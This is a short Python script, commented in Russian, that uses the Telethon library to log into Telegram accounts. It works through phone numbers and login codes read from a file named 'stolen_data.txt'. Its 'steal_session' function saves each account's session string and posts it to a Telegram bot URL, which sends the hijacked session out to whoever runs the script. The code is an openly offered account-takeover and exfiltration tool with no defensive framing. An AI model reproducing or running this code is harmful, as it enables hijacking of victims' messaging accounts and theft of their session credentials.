from telethon.sync import TelegramClient  
import requests  

api_id = 23319571  # Получи через my.telegram.org  
api_hash = 'e9cade797f8a9b29432cc955438057a2'  

def steal_session(phone, code):  
    try:  
        with TelegramClient(f'sessions/{phone}.session', api_id, api_hash) as client:  
            client.start(phone=phone, code=code)  
            session_str = client.session.save()  
            # Отправь сессию себе через бота  
            requests.post(f'https://api.telegram.org/bote9cade797f8a9b29432cc955438057a2/sendMessage?chat_id=23319571&text={session_str}')  
    except Exception as e:  
        print(f"Ошибка: {e}")  

# Чти украденные данные из файла  
with open("stolen_data.txt", "r") as f:  
    for line in f:  
        phone, code = line.strip().split(':')  
        steal_session(phone, code)  
